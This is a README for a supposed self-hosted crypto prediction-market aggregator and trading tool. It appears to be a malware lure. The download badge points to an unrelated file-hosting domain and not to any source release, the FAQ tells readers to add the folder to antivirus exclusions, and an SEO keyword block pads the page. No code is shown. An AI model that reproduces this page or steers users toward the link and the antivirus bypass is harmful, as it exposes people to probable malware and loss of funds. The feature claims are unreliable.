# Crypto Prediction Market Tool 🔮📊

A unified, self-hosted layer for **crypto prediction markets** that treats Polymarket, Kalshi, Limitless, and other venues as one data source instead of five separate APIs. Instead of rewriting your integration every time a platform changes its schema, this tool gives you a single interface for market discovery, odds streaming, order placement, and cross-platform arbitrage detection — with an MCP server so AI agents can query prediction markets directly. Everything runs locally; no vendor lock-in, no mandatory API keys for core data.

[![Download Crypto Prediction Market Tool](https://img.shields.io/badge/Download-Crypto_Prediction_Market_Tool-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Venues](https://img.shields.io/badge/venues-8%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Crypto Prediction Market Tool](#-why-choose-crypto-prediction-market-tool)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt` (or `npm install`).
3. Run `pmxt markets --venue polymarket --query "bitcoin"` or start the HTTP server.

The tool returns normalized market objects with odds, volume, and resolution dates across all configured venues.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 2 GB minimum |
| Storage | 200 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Unified Market Access**

- 🔗 **Multi-Venue Data** — Polymarket, Kalshi, Limitless, Myriad, Opinion, Metaculus, and Smarkets behind one interface.
- 📊 **Normalized Schemas** — every market returns the same fields regardless of the underlying platform.
- 🔍 **Cross-Platform Search** — find the same event across venues with fuzzy matching and group IDs.
- 💹 **Real-Time Odds Streaming** — WebSocket feeds with auto-reconnect and price event hooks.

**Arbitrage & Analytics**

- 🎯 **Cross-Platform Arbitrage Detection** — flags price discrepancies for the same event across different venues.
- 🐋 **Whale Tracking** — large position changes and copy-trade signals from top traders.
- 📈 **Market Analytics** — volume, liquidity, resolution dates, and historical odds snapshots.
- 🧠 **AI Research (Optional)** — LLM-generated event summaries attached to market data.

**Trading & Execution**

- 💼 **Paper Trading** — simulated fills with configurable fees, slippage, and risk limits.
- ⚡ **Unified Order Interface** — place orders across Polymarket, Kalshi, and Limitless through one API.
- 🛡️ **Risk Controls** — position limits, max exposure, and kill switches per strategy.
- 🔌 **MCP-Native** — works directly with Claude, Cursor, and any MCP-compatible AI agent.

**Self-Hosted & Open**

- 🐳 **Docker Support** — one-command deployment with `docker compose up`.
- 🔐 **No Mandatory API Keys** — core market data works through public endpoints.
- 📡 **HTTP & CLI** — same interface from Python, TypeScript, or any HTTP client.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| venue_connector | Unified access to 8+ prediction venues | Python / TS / HTTP |
| market_normalizer | Consistent schema across platforms | Python API |
| arbitrage_engine | Cross-platform price discrepancy detection | CLI / API |
| odds_streamer | Real-time WebSocket odds feeds | WebSocket |
| whale_tracker | Large position and copy-trade signals | CLI / API |
| paper_trader | Simulated fills with cost models | CLI |
| order_router | Unified order placement | Python / TS |
| mcp_server | MCP wrapper for AI agents | stdio / HTTP |

## 🚀 Why Choose Crypto Prediction Market Tool

- ✅ Unified by design — one interface for Polymarket, Kalshi, Limitless, and others, instead of five separate SDKs.
- ✅ Arbitrage-aware — cross-platform price discrepancies are surfaced as first-class signals, not manual checks.
- ✅ MCP-native — AI agents can query prediction markets directly through Claude, Cursor, or any MCP client.
- ✅ Self-hosted and open — no vendor lock-in, no mandatory API keys for core data, and Docker deployment in one command.
- ✅ Paper-first — every strategy can be validated with simulated fills before real capital is committed.

## 💡 Why Use It

- 🔮 Track the same event across multiple prediction markets without writing separate integrations.
- 📊 Spot arbitrage opportunities between venues before they close.
- 🐋 Follow large traders and copy-trade signals from whale activity.
- 🤖 Let an AI agent query prediction market odds through MCP without building a custom data layer.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the tool runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python or Node entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Do I need API keys for every venue?**
Core market data works without keys through public endpoints; trading and higher rate limits require venue-specific keys.

**How do I update?**
Pull the latest archive and reinstall dependencies — venue configs and cached data are preserved.

## 🔎 SEO Keywords

Crypto Prediction Market Tool, crypto prediction market API, prediction market aggregator, unified prediction market API, Polymarket API tool, Kalshi API tool, prediction market arbitrage, cross-platform prediction market, prediction market data tool, prediction market SDK, self-hosted prediction market, prediction market MCP, AI agent prediction market, prediction market odds streaming, prediction market whale tracker, open source prediction market, prediction market analytics, crypto event trading tool, prediction market GitHub, prediction market paper trading

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any prediction market platform you interact with. Trading involves financial risk.
